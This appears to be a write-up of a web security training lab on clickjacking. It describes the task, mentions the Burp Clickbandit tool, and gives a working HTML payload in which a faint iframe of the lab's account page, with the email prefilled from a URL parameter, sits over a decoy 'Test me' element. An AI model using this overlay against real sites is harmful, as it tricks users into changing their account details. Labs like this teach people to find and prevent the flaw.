Tile:Clickjacking with form input data prefilled from a URL parameter
Desc: This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
You can log in to your own account using the following credentials: wiener:peter 

# Theory:
Clickbandit

Although you can manually create a clickjacking proof of concept as described above, this can be fairly tedious and time-consuming in practice. When you're testing for clickjacking in the wild, we recommend using Burp's Clickbandit tool instead. This lets you use your browser to perform the desired actions on the frameable page, then creates an HTML file containing a suitable clickjacking overlay. You can use this to generate an interactive proof of concept in a matter of seconds, without having to write a single line of HTML or CSS. 

# Walkthrough:
there is one trick in this lab - you can provide email by parameter in url:
<img width="973" height="612" alt="image" src="https://github.com/user-attachments/assets/bd1095f0-a632-4d83-ba63-da3a851a883a" />


```
<style>
    iframe {
        position:relative;
        width: 400;
        height: 550;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 456;
        left: 50;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a78006703df7cf080ff036c00a50061.web-security-academy.net/my-account?email=test4@gmail.com"></iframe>
```
